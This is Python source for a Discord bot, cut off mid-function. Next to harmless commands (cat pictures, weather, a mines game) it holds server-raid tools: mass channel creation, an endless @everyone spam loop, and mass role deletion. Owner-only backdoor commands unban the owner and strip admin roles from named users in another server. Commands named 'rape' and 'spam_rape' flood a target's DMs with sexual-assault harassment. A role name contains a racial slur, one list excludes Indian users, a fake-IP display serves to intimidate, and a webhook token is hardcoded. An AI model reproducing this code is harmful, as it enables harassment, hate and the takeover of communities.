import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import time
import os
from dotenv import load_dotenv
import random
import aiohttp
from bs4 import BeautifulSoup
import requests
from words import words
from PIL import Image
import io
from datetime import datetime

os.system('pip install pytz')
import pytz

load_dotenv()  # Load environment variables from.env file

bubble_image_path = os.path.join(os.path.dirname(__file__), "image.gif")
bubble_image = Image.open(bubble_image_path).convert("RGBA")

connection_string = os.getenv("MONGO")

token = os.getenv('DISCORD_BOT_TOKEN')
owner_id = 946386383809949756 #dovyrn
imintomen_id = 1142107446458978344
weather_api_key = os.getenv('WEATHER_API_KEY')

# Define the necessary intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent (if needed)
intents.members = True

auto_remove = False

frequent_uses = {}




mass_sending = False

bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)

WEBHOOK_URL = "https://discord.com/api/webhooks/1294584017605365781/RTgHVItbFfHAnwB_uyjGVzTuzaiVHuha-ZoP7Hsl0Xr6r_OyTIIXfGkKH2unDFbgVhnU"

bangla_list = ["https://tenor.com/view/bangla-bangladeshi-gifgari-shomudro-bilash-private-limited-natok-gif-25397183",
               "https://tenor.com/view/marjuk-rasel-gifgari-bangla-bangla-gif-bangladesh-gif-18042831",
               "https://tenor.com/view/more-gelam-kazi-maruf-gifgari-bangla-cinema-bangladesh-gif-19921536",
               "https://tenor.com/view/razzak-gifgari-gifgari-classic-bangla-chobi-bangla-cinema-gif-18198237",
               "https://tenor.com/view/madari-madari-bhai-madara-madara-uchiha-naruto-gif-6546085761222317001",
               "https://tenor.com/view/rezoan-rezoan-gifgari-rezoan-bd-akil-akhtab-rezoan-boka-baksho-gif-23546120",
               "https://tenor.com/view/gifgari-classic-gifgari-bangladesh-bangla-gif-bangla-cinema-gif-18197935",
               "https://tenor.com/view/dipjol-bangla-cinema-abar-bol-gifgari-bangladesh-gif-19921422",
               "https://tenor.com/view/gifgari-chondokobi-ripon-ripon-video-bangla-bangla-gif-gif-18289155",
               "https://tenor.com/view/gifgari-gifgari-classic-razzak-hoi-hoi-hoi-rongila-gif-18208824"]






async def fetch_fun_fact():
    url = "https://www.thefactsite.com/1000-interesting-facts/"

    # Fetch the website content
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                # Extract all fact elements from <p> tags with class="list"
                facts = soup.find_all("p", class_="list")

                # Choose a random fact from the list
                if facts:
                    random_fact = random.choice(facts).get_text()
                    return random_fact.strip()  # Strip any leading/trailing whitespace
                else:
                    return "Couldn't find any fun facts."
            else:
                return "Failed to retrieve fun facts."

async def fetch_motivational_quotes():
    url = "https://www.shopify.com/blog/motivational-quotes"

    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                quotes = soup.find_all("li")

                if quotes:
                    random_quote = random.choice(quotes).get_text()
                    return random_quote.strip()  # Strip any leading/trailing whitespace
                else:
                    return "Couldn't find any motivational quotes."
            else:
                return "Failed to retrieve motivational quotes."
            

class RemoveAdminView(discord.ui.View):
    def __init__(self, admins):
        super().__init__()
        self.admins = admins

        # Create a select menu for the admin users
        select_menu = discord.ui.Select(
            placeholder="Select a user to remove admin roles",
            options=[discord.SelectOption(label=display_name, value=str(user_id)) for user_id, display_name in admins]
        )
        select_menu.callback = self.remove_admin_roles  # Assign callback
        self.add_item(select_menu)

    async def remove_admin_roles(self, interaction: discord.Interaction):
        # Get selected user ID
        selected_user_id = int(self.children[0].values[0])
        selected_user = interaction.guild.get_member(selected_user_id)

        if selected_user:
            # List of roles that have admin permissions
            admin_roles = [role for role in selected_user.roles if role.permissions.administrator]

            if admin_roles:
                # Remove all admin roles
                await selected_user.remove_roles(*admin_roles)
                await interaction.response.send_message(
                    f"Removed admin roles from {selected_user.display_name}: {', '.join(role.name for role in admin_roles)}.",
                    ephemeral=True
                )
            else:
                await interaction.response.send_message(f"{selected_user.display_name} has no roles with admin permissions.", ephemeral=True)
        else:
            await interaction.response.send_message("Could not find the selected user.", ephemeral=True)


conversation_history = []

@bot.event
async def on_ready():   
    print(f'Bot is ready as {bot.user}')
    await bot.change_presence(status=discord.Status.online)
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

@bot.tree.command(name="cat", description="Meow Meow")
async def cat(interaction: discord.Interaction):
    """Sends a random cat picture with a deferred response."""

    # Defer the interaction response to let the user know we're working on it
    await interaction.response.defer()

    async with aiohttp.ClientSession() as session:
        async with session.get("https://api.thecatapi.com/v1/images/search") as response:
            if response.status == 200:
                data = await response.json()
                cat_url = data[0]["url"]
                
                embed = discord.Embed(title=None)
                embed.set_image(url=cat_url)
                
                # Send the follow-up response with the cat picture
                await interaction.followup.send(embed=embed)
            else:
                await interaction.followup.send("Could not fetch a cat picture at the moment. Try again later!")


@bot.tree.command(name="weather", description="Get the current temperature and the condition")
async def weather(interaction: discord.Interaction, city: str):
    def get_weather(api_key, location):
        url = f"http://api.weatherapi.com/v1/current.json?key={api_key}&q={location}&aqi=no"

        # Make the API call
        response = requests.get(url)
        
        # Check if the response was successful
        if response.status_code == 200:
            data = response.json()
            
            # Extract and display weather information
            location_name = data["location"]["name"]
            region = data["location"]["region"]
            country = data["location"]["country"]
            temp_c = data["current"]["temp_c"]
            condition = data["current"]["condition"]["text"]
            
            return(f"Weather in {location_name}, {region}, {country}:\nTemperature: {temp_c}°C\nCondition: {condition}")

        else:
            return(f"Error: Unable to get weather data. Status code {response.status_code}")
    await interaction.response.send_message(get_weather(api_key=weather_api_key, location=city))


@bot.tree.command(name="check_admin", description="Check which users have admin permissions")
async def check_admins(interaction: discord.Interaction):
    if interaction.user.id == owner_id:  # Ensure only the owner can run this
        admins = [
            (member.id, member.display_name) for member in interaction.guild.members
            if any(role.permissions.administrator for role in member.roles)
        ]

        if admins:
            # Create a view with the select menu and send it
            view = RemoveAdminView(admins)
            await interaction.response.send_message(
                f"The following users have admin permissions: {', '.join(display_name for _, display_name in admins)}",
                view=view,
                ephemeral=True
            )
        else:
            await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)




@bot.event
async def on_member_update(before, after):
    if before.roles != after.roles:
        added_roles = [role for role in after.roles if role not in before.roles]
        removed_roles = [role for role in before.roles if role not in after.roles]
        
        # Determine the title based on the action (added or removed)
        if added_roles:
            title = "User Roles Added"
            roles = ", ".join([role.mention for role in added_roles])
            color = discord.Color.green()
        elif removed_roles:
            title = "User Roles Removed"
            roles = ", ".join([role.mention for role in removed_roles])
            color = discord.Color.red()
        
        # Attempt to find the member who made the change by checking the audit logs
        action_member = None
        async for entry in after.guild.audit_logs(action=discord.AuditLogAction.member_role_update, limit=1):
            if entry.target.id == after.id:
                action_member = entry.user
                break
        
        # Create the embed
        embed = discord.Embed(
            title=title,
            color=color,
            description=(f"**User:** {after.mention} ({after})\n"
                         f"**{'Added' if added_roles else 'Removed'}:** {roles}")
        )
        
        # Add the thumbnail
        embed.set_thumbnail(url=after.display_avatar.url)
        
        # Get the local time in GMT+8
        gmt_plus_8_tz = pytz.timezone("Asia/Singapore")  # GMT+8 Time Zone
        gmt_plus_8_time = datetime.now(gmt_plus_8_tz).strftime('%I:%M %p')

        # Format the footer with username and time, and show who made the change
        action_text = f"by {action_member.display_name}" if action_member else "by Unknown"
        
        # Set the footer with the avatar of the member who made the change
        embed.set_footer(
            text=f"@{after.display_name} • Today at {gmt_plus_8_time} {action_text}",
            icon_url=action_member.display_avatar.url if action_member else None  # Use the avatar of the action member
        )
        

        channel = after.guild.get_channel(1304011208948453417)
        if channel:
            await channel.send(embed=embed)

@bot.tree.command()
@app_commands.describe(state="True/False")
async def toggle(interaction: discord.Interaction, state: str):
    if interaction.user.id == owner_id:
        global auto_remove
        if state.lower() == "true":
            auto_remove = True
            await interaction.response.send_message("Set toggle to True", ephemeral=True)
        elif state.lower() == "false":
            auto_remove = False
            await interaction.response.send_message("Set toggle to False", ephemeral=True)
        else:
            await interaction.response.send_message("Invalid state. Please use True or False", ephemeral=True)
    else:
        return

@bot.tree.command()
@app_commands.describe(name="What name for the channels", amount= "How many channels to create")
async def create(interaction: discord.Interaction, name: str, amount: int):
    interaction.response.defer()
    if interaction.user.id == owner_id:
        start_time = time.time()
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = interaction.guild

        async def create_channel():
            await guild.create_text_channel(name)

        # Create a list of tasks for creating channels
        tasks = [create_channel() for _ in range(amount)]
        
        # Run all tasks concurrently
        await asyncio.gather(*tasks)

        end_time = time.time()
        duration = end_time - start_time
        
        await interaction.followup.send(f"Created {amount} channels named '{name}' in {duration:.2f} seconds.")
    else:
        await interaction.followup.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.hybrid_command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def remove(ctx, prefix: str):
    if ctx.author.id == owner_id:
        
        # Get all channels that start with the given prefix
        existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
        if existing_channels:
            # Create a list of tasks for deleting channels
            delete_tasks = [channel.delete() for channel in existing_channels]
            
            # Run all deletion tasks concurrently
            await asyncio.gather(*delete_tasks)
            await print(f"Deleted {len(existing_channels)} channels starting with '{prefix}'.")
        else:
            await print(f"No channels starting with '{prefix}' to remove.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def mass(ctx, content: str, channel_name: str):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = ctx.guild
        
        mass_sending = True  # Set the flag to true to start mass sending

        while mass_sending:  # Check the flag in the loop
            # Get all text channels in the guild, filter by channel name
            channels = [channel for channel in guild.text_channels if channel.name.startswith(channel_name)]

            tasks = []
            for channel in channels:
                tasks.append(asyncio.create_task(channel.send(f"{content}", allowed_mentions=allow_mentions)))
            await asyncio.gather(*tasks)
            print(f"Sent message '@everyone {content}' to {len(channels)} channels.")

    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def stop_mass(ctx):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        mass_sending = False  # Set the flag to false to stop mass sending
        await ctx.send("Mass messaging has been stopped.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def addrole(ctx, role_name: str, role_amount : int):
    if ctx.author.id == owner_id:
        
        guild = ctx.guild
        async def create_role():
            role = await guild.create_role(name=role_name)
        tasks = [create_role() for _ in range(role_amount)]
        await asyncio.gather(*tasks)
        print(f"Created {role_amount} roles named '{role_name}'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def delrole(ctx):
    if ctx.author.id == owner_id:
        
        bot_role = ctx.guild.me.top_role  # Get the bot's highest role
        # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
        roles_to_delete = [
            role for role in ctx.guild.roles 
            if role != bot_role and role.name != "@everyone" and role.name != "legit bot test"
        ]

        if roles_to_delete:
            # Create a list of delete tasks
            delete_tasks = [role.delete() for role in roles_to_delete]
            
            # Use asyncio.gather to run all delete tasks concurrently
            await asyncio.gather(*delete_tasks)
            
            await print(f"Deleted {len(roles_to_delete)} roles.")
        else:
            await print("No roles to delete except for the bot's role and 'legit bot test'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.tree.command(name="ascend")
async def ascend(Interaction: discord.Interaction):
    if Interaction.user.id == owner_id:
        role_names = ["Hacker", "cheems nigger slave"]
        roles = [discord.utils.get(Interaction.guild.roles, name=name) for name in role_names]

        member = Interaction.guild.get_member(owner_id)
        
        if any(role is None for role in roles):
            await Interaction.response.send_message(f"One or more of the roles '{', '.join(role_names)}' are a phantom. Please summon them into existence first.", ephemeral=True)
            return
        for role in roles:
            try:
                await Interaction.user.add_roles(role)
            except discord.Forbidden:
                await Interaction.response.send_message("Regrettably, I lack the ability to wield the power of roles.", ephemeral=True)
                return
        await Interaction.response.send_message("With great power comes great responsibility.", ephemeral=True)
    else:
        await Interaction.response.send_message("A mortal shall not be given power...")

@bot.tree.command(name="server_info", description="Displays information about the server.")
async def server_info(interaction: discord.Interaction):
    await interaction.response.defer()  # Defer the response to avoid timeout

    guild = interaction.guild
    members = len(guild.members)
    channels = len(guild.channels)
    roles = len(guild.roles)
    emotes = guild.emojis
    emoji_amount = len(emotes)
    guild_id = guild.id
    name = guild.name
    owner = guild.owner.mention
    created_at = guild.created_at
    invite_link = await interaction.channel.create_invite()


    short_datetime = discord.utils.format_dt(created_at, style="f")

    # Use relative time with Discord's utility to show "a year ago" or similar
    relative_time = discord.utils.format_dt(created_at, style="R")

    async def get_most_used_channel():
        text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
        most_recent_message_channel = None
        latest_message_time = None

        for channel in text_channels:
            try:
                messages = [message async for message in channel.history(limit=10) if not message.author.bot]
                if messages:
                    recent_message = max(messages, key=lambda msg: msg.created_at)
                    if latest_message_time is None or recent_message.created_at > latest_message_time:
                        most_recent_message_channel = channel
                        latest_message_time = recent_message.created_at
            except discord.Forbidden:
                continue

        return most_recent_message_channel

    most_used_channel = await get_most_used_channel()
    most_used_channel_name = most_used_channel.mention if most_used_channel else "None"

    embed = discord.Embed(
        title=f"Server Info: {name}",
        description=(
            f"Owner: {owner}\n"
            f"ID: {guild_id}\n"
            f"Created at:\n"
            f"{short_datetime} ({relative_time})\n"
            f"Members: {members}\n"
            f"Channels: {channels}\n"
            f"Roles: {roles}\n"
            f"Emojis: {emoji_amount}\n"
            f"Most Active Channel: {most_used_channel_name}\n"
            f"Invite link: {invite_link}"
        ),
        color=discord.Color.blue()
    )

    await interaction.followup.send(embed=embed)  # Send the response using followup


@bot.tree.command(name="user_info", description="Shows information about a specified user.")
async def user_info(interaction: discord.Interaction, user: discord.User):
    await interaction.response.defer()  # Defer the response to avoid timeout

    # User properties
    username = user.name
    user_avatar = user.avatar.url if user.avatar else None
    user_id = user.id
    created_date = user.created_at.strftime("%B %d, %Y %I:%M %p")
    joined_date = user.joined_at.strftime("%B %d, %Y %I:%M %p") if hasattr(user, 'joined_at') else "N/A"
    roles = [role.mention for role in user.roles] if hasattr(user, 'roles') else []
    roles_amount = len(roles)
    permissions = ', '.join(perm[0] for perm in user.guild_permissions if perm[1]) if hasattr(user, 'guild_permissions') else "N/A"
    nickname = user.nick if hasattr(user, 'nick') else "No nickname"
    mention = user.mention
    def generate_random_ip():
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    # Embed
    embed = discord.Embed(
        title=f"{username}'s Information",
        description=(
            f"**User ID:** {user_id}\n"
            f"**Created Date:** {created_date}\n"
            f"**Joined Date:** {joined_date}\n"
            f"**Roles Amount:** {roles_amount}\n"
            f"**Roles:** {', '.join(roles) if roles else 'No roles'}\n"
            f"**Permissions:** {permissions}\n"
            f"**Nickname:** {nickname}\n"
            f"**Mention:** {mention}\n"
            f"\n"
            f"**IP ADDRESS:** {generate_random_ip()}"
        ),
        color=discord.Color.blue()
    )
    
    if user_avatar:
        embed.set_thumbnail(url=user_avatar)
    
    embed.set_footer(text="By LegitBotTest")

    await interaction.followup.send(embed=embed)

@bot.tree.command()
@app_commands.choices(
    mode=[
        app_commands.Choice(name="Easy", value="easy"),
        app_commands.Choice(name="Medium", value="medium"),
        app_commands.Choice(name="Hard", value="hard")
    ]
)
async def mines(interaction: discord.Interaction, mode: str, bet: int):

        coal_emoji = bot.get_emoji(1302933242659344485)
        diamond_emoji = bot.get_emoji(1302932787938070528)
        barrier = bot.get_emoji(1302932467463753799)

        tiles = {
            "easy": 5,    # 5x5 grid
            "medium": 4,  # 4x4 grid
            "hard": 3     # 3x3 grid
        }
        bombs_count = 4

        current_multiplier = 1

        multiplier = {
            "easy": 0.15,
            "medium": 0.3,
            "hard": 0.5
        }

        grid_size = tiles[mode]
        possible = grid_size * grid_size

        # Initialize the grid with grey question marks in a 2D structure
        grid = [[":grey_question:" for _ in range(grid_size)] for _ in range(grid_size)]

        # Generate bomb positions
        def generate_bombs(mode):
            bomb_positions = set()
            while len(bomb_positions) < bombs_count:
                bomb_positions.add(random.randint(0, possible - 1))
            return list(bomb_positions)

        bomb_positions = generate_bombs(mode)

        # Function to format the grid as a string
        def format_grid():
            return "\n".join("".join(row) for row in grid)

        embed = discord.Embed(
            colour=discord.Colour.blue(),
            title=f"{coal_emoji} Mines game",
            description=f"{format_grid()}\n:coin: Bet Amount: **{round(bet, 1)}**    {barrier} Bombs Amount: **{bombs_count}**\n{diamond_emoji} Safe Amount: **{possible - bombs_count}**    :money_bag: Multiplier: **{round(current_multiplier, 2)}x (+{round(current_multiplier -1)}x)**"
        )

        # Send the initial message and store the message object
        await interaction.response.send_message(embed=embed)  # Initial response
        initial_message = await interaction.original_response()  # Get the original response message

        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel

        ended = False
        while not ended:
            guess = await bot.wait_for('message', check=check, timeout=60)
            if guess.content.lower() == "withdraw":
                ended = True
            else:
                try:
                    guess_index = int(guess.content) - 1  # Adjust for 0-based indexing
                    row = guess_index // grid_size
                    col = guess_index % grid_size

                    if guess_index in bomb_positions:
                        # Update the grid to show the barrier emoji where the bomb was
                        for bomb_index in bomb_positions:
                            bomb_row = bomb_index // grid_size
                            bomb_col = bomb_index % grid_size
                            grid[bomb_row][bomb_col] = str(barrier)  # Replace bomb with barrier

                        # Replace all question marks with diamonds
                        for r in range(grid_size):
                            for c in range(grid_size):
                                if grid[r][c] == ":grey_question:":
                                    grid[r][c] = str(diamond_emoji)  # Replace question mark with diamond

                        # Edit the original message with the updated grid state
                        embed.description = f"{format_grid()}\n\n:coin: Bet Amount: **{round(bet, 1)}**    {barrier} Bombs Amount: **{bombs_count}**\n{diamond_emoji} Safe Amount: **{possible - bombs_count}**    :money_bag: Multiplier: **{round(current_multiplier, 2)}x**"
                        await initial_message.edit(embed=embed)  # Edit the original message
                        await interaction.channel.send("You lose!")  # Send loss message
                        current_multiplier = 0
                        ended = True
                    elif 0 <= guess_index < possible and grid[row][col] == ":grey_question:":
                        grid[row][col] = str(diamond_emoji)  # Replace question mark with diamond
                        current_multiplier += multiplier[mode]

                        # Edit the original message with the updated grid state
                        embed.description = f"{format_grid()}\n\n:coin: Bet Amount: **{round(bet, 1)}**    {barrier} Bombs Amount: **{bombs_count}**\n{diamond_emoji} Safe Amount: **{possible - bombs_count}**    :money_bag: Multiplier: **{round(current_multiplier, 2)}x (+{round(current_multiplier -1), 2}x)**"
                        await initial_message.edit(embed=embed)  # Edit the original message
                    else:
                        await interaction.channel.send("Invalid input! Please enter a valid number or 'withdraw'.")
                except ValueError:
                    await interaction.channel.send("Please enter a number or 'withdraw'.")

        money = round(bet * current_multiplier, 2)
        await interaction.channel.send(f"You won {money}$")

@bot.tree.command(name="gr")
async def give_role(interaction: discord.Interaction, name: str):
    if interaction.user.id == owner_id:
        # Find the guild (server)
        target_guild = bot.get_guild(imintomen_id)
        if target_guild is None:
            await interaction.response.send_message(f"Bot is not in the server with ID {imintomen_id}.", ephemeral=True)
            return

        # Find the role by name in the guild
        role = discord.utils.get(target_guild.roles, name=name)
        if role is None:
            await interaction.response.send_message(f"The role '{name}' does not exist in this server.", ephemeral=True)
            return

        # Add the role to the user
        member = target_guild.get_member(interaction.user.id)
        if member:
            await member.add_roles(role)
            await interaction.response.send_message(f"Role '{name}' has been added to you.", ephemeral=True)
        else:
            await interaction.response.send_message("Could not find you in the target server.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)


@bot.event
async def on_message_delete(message):
    embed = discord.Embed(
        title="Message deleted",
        color = discord.Color.red,
        description=(
            f'> **Channel**: {message.channel.jump_url}'
            f'> **Message**: {message.content}'
            f'> **Author**: {message.author.mention}'
        )
    )
    await bot.get_channel(1304010820547641354).send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    embed = discord.Embed(
        title="Message edited",
        color = discord.Color.orange(),
        description=(
            f'> **Channel**: {before.channel.jump_url}'
            f'> **Author**: {before.author.mention}'

            f"> **Before**: {before.content}"
            f"> **After**: {after.content}"   

        )
    )
    await bot.get_channel(1304010683788300298).send(embed=embed)




@bot.event
async def on_member_update(before, after):
    if before.roles != after.roles:
        added_roles = [role for role in after.roles if role not in before.roles]
        removed_roles = [role for role in before.roles if role not in after.roles]
        
        # Determine the title based on the action (added or removed)
        if added_roles:
            title = "User Roles Added"
            roles = ", ".join([role.mention for role in added_roles])
            color = discord.Color.green()
        elif removed_roles:
            title = "User Roles Removed"
            roles = ", ".join([role.mention for role in removed_roles])
            color = discord.Color.brand_red()
        
        # Attempt to find the member who made the change by checking the audit logs
        action_member = None
        async for entry in after.guild.audit_logs(action=discord.AuditLogAction.member_role_update, limit=1):
            if entry.target.id == after.id:
                action_member = entry.user
                break
        
        # Create the embed
        embed = discord.Embed(
            title=title,
            color=color,
            description=(f"> **User:** {after.mention} ({after})\n"
                         f"> **{'Added' if added_roles else 'Removed'}:** {roles}")
        )
        
        # Add the thumbnail
        embed.set_thumbnail(url=after.display_avatar.url)
        
        # Format the footer with username and time, and show who made the change
        action_text = f"{action_member.name}" if action_member else "by Unknown"
        time = discord.utils.utcnow().strftime('%I:%M %p')
        embed.set_footer(text=f"@{action_text}  •  Today at {time}", icon_url=action_member.display_avatar.url if action_member else None)
        

        channel = after.guild.get_channel(1304011208948453417)
        if channel:
            await channel.send(embed=embed)



@bot.command()
async def create_invite(ctx):
    target_guild = bot.get_guild(imintomen_id)
    if target_guild:
            # Get the first text channel in the server to create an invite
        channel = target_guild.text_channels[0]
        invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
        await ctx.send(f"Embark on your journey here: {invite}")
    else:
        await ctx.send("The bot is not in the target server.")

@bot.command()
async def unban(ctx):
    if ctx.author.id == owner_id:
        target_guild = bot.get_guild(imintomen_id)
        if target_guild is None:
            await ctx.send(f"Bot is not in the server with ID {imintomen_id}.")
            return

        try:
            bans = target_guild.bans()
            async for ban_entry in bans:
                user = ban_entry.user
                if user.id == owner_id:
                    await target_guild.unban(user)
                    await ctx.send(f"{user.name} has been unbanned.")
                    break
            else:
                await ctx.send("The Master is not banned in this server.")
        except discord.Forbidden:
            await ctx.send("I do not have permission to unban members.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def state(ctx, state_type):
    if ctx.author.id == owner_id:
        if state_type == "idle":
            await bot.change_presence(status=discord.Status.idle)
        elif state_type == "dnd":
            await bot.change_presence(status=discord.Status.dnd)
        elif state_type == "online":
            await bot.change_presence(status=discord.Status.online)
        elif state_type == "offline":
            await bot.change_presence(status=discord.Status.offline)
        else:
            await ctx.send("Pleas uese 'idle', 'dnd', 'online' or 'offline'. ")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing.")



@bot.command()
async def clear_mass(ctx, content: str):
    if ctx.author.id == owner_id:
        deleted_count = 0  # Initialize the deleted_count here

        # Iterate through all the text channels in the guild where the command was issued
        for channel in ctx.guild.text_channels:
            if not channel.permissions_for(ctx.guild.me).read_messages:
                print(f"I don't have permission to read messages in {channel.name}.")
                continue  # Skip channels where the bot can't read messages

            try:
                messages_to_delete = []
                async for message in channel.history(limit=1000):  # Adjust the limit as needed
                    # Check if the message was sent by the bot and contains the specific content
                    if message.author == bot.user and content in message.content:
                        messages_to_delete.append(message)

                # Delete messages in batches
                if messages_to_delete:
                    await asyncio.gather(*(msg.delete() for msg in messages_to_delete))
                    deleted_count += len(messages_to_delete)  # Increment by the number of messages deleted

            except discord.Forbidden:
                print(f"I don't have permission to delete messages in {channel.name}.")
            except discord.HTTPException as e:
                print(f"An error occurred: {e}")

        # Print the result message after attempting to delete all the matching messages
        print(f"Deleted {deleted_count} messages containing '{content}' sent by the bot.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def alive(ctx):
    await ctx.send("I'm alive!")
@bot.command()
async def activity(ctx, state: str):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=discord.Game(state))
        await ctx.send(f"Changed activity to '{state}'.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")
@bot.command()
async def activity_clear(ctx):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=None)
        await ctx.send("Cleared activity.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")

@bot.command()
async def rape(ctx, user: discord.User):
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    try:
            await user.send(rape_message)
    except discord.Forbidden:
        await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")


@bot.tree.command()
@app_commands.describe(message="The message to send", amount="Amount of messages to send", batch = "Batches of messages to send")
async def spam(interaction: discord.Interaction, message: str, amount: int, batch : int):
    if amount > 25 and interaction.user.id != owner_id:
        await interaction.response.send_message("Maximum amount of 25 messages for Mortals.")
        return
    start_time = time.time()

    batch_size = batch  # Increased batch size
    batches = [message] * batch_size

    async def send_batch(messages):
        try:
            # Concatenate the messages into a single string
            message_text = '\n'.join(messages)
            await interaction.channel.send(message_text)
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")

    tasks = []
    for i in range(0, amount, batch_size):
        batch = batches[:amount - i]
        tasks.append(asyncio.create_task(send_batch(batch)))

    await asyncio.gather(*tasks)
    end_time = time.time()
    duration = end_time - start_time
    await interaction.response.send_message(f"Spammed {amount} messages in {duration:.2f} seconds.")



@bot.command()
async def purge(ctx, message):
    deleted_count = 0
    async for msg in ctx.channel.history(limit=100):
        if msg.author == bot.user and msg.content == message:
            await msg.delete()
            deleted_count += 1
    await ctx.send(f"Deleted {deleted_count} with the content {message}")

@bot.command()
@commands.cooldown(per=1, rate=5)
async def spam_rape(ctx, user: discord.User, amount: int):
    indians = [755472029049946303, 755475988149960866, 1223229005382025217, 907174800487743558]
    if ctx.author.id in indians:
        await ctx.send("This command is not for indians")
        return
    if amount > 100 and ctx.author.id!= owner_id:
        await ctx.send("Maximum amount of 25 messages for Mortals.")
        return
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    async def send_message():
        try:
            await user.send(rape_message    )
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")
        except discord.Forbidden:
            await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")

    # Group messages in chunks to stay within rate limits
    tasks = []
    for i in range(amount):
        tasks.append(send_message())
        
        if (i + 1) % 10 == 0:
            await asyncio.gather(*tasks)
            tasks.clear()
    if tasks:
        await asyncio.gather(*tasks)

    await ctx.send(f"<@{ctx.author.id}> Finished raping <@{user.id}>")
    
@bot.tree.command(name="rar")
async def remove_admin_roles(interaction: discord.Interaction):
    target_server_id = imintomen_id  # Replace with your target server's ID
    user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs
    
    target_guild = bot.get_guild(target_server_id)  # Get the target server (guild)

    if target_guild is None:
        await interaction.response.send_message(f"I am not in the server with ID {target_server_id}.", ephemeral=True)
        return

    removed_roles_count = 0

    if interaction.user.id == owner_id:  # Ensure only the bot owner can run this
        await interaction.response.send_message("Starting to remove admin roles...", ephemeral=True)  # Initial response

        for user_id in user_ids:
            try:
                # Fetch the member explicitly from the server
                target_user = await target_guild.fetch_member(user_id)

                if target_user is None:
                    await interaction.followup.send(f"User with ID {user_id} is not in the target server.", ephemeral=True)
                    continue

                # Get all roles with admin permissions
                admin_roles = [role for role in target_user.roles if role.permissions.administrator]

                if not admin_roles:
                    await interaction.followup.send(f"{target_user.mention} does not have any admin roles.", ephemeral=True)
                    continue

                try:
                    # Remove each admin role
                    for role in admin_roles:
                        await target_user.remove_roles(role)
                    removed_roles_count += len(admin_roles)
                    await interaction.followup.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.", ephemeral=True)
                
                except discord.Forbidden:
                    await interaction.followup.send(f"I do not have permission to remove roles from {target_user.mention} in the target server.", ephemeral=True)
                
                except discord.HTTPException as e:
                    await interaction.followup.send(f"An error occurred while removing roles from {target_user.mention}: {e}", ephemeral=True)

            except discord.NotFound:
                await interaction.followup.send(f"User with ID {user_id} was not found in the target server.", ephemeral=True)
            except discord.HTTPException as e:
                await interaction.followup.send(f"Failed to fetch user {user_id} from the target server: {e}", ephemeral=True)

        # Final message after loop
        if removed_roles_count == 0:
            await interaction.followup.send("No admin roles were removed from the specified users.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)

@commands.cooldown(per=300, rate=2)
@bot.tree.command(name="suggest", description="Suggest a command to add")
@app_commands.describe(idea="The idea you want to suggest.")
async def suggestion(interaction : discord.Interaction, idea: str):
    avatar = interaction.user.avatar.url
    suggestion_embed = discord.Embed(
        colour=discord.Colour.blue(),
        title=f"{interaction.user.display_name} added a new suggestion!",
        description=idea
    )
    suggestion_embed.set_thumbnail(url=avatar)
    suggestion_embed.set_footer(text=f"Suggested by {interaction.user.name}#{interaction.user.discriminator}")
    try:
        owner = await bot.fetch_user(owner_id)
        try:
            await owner.send(embed=suggestion_embed)
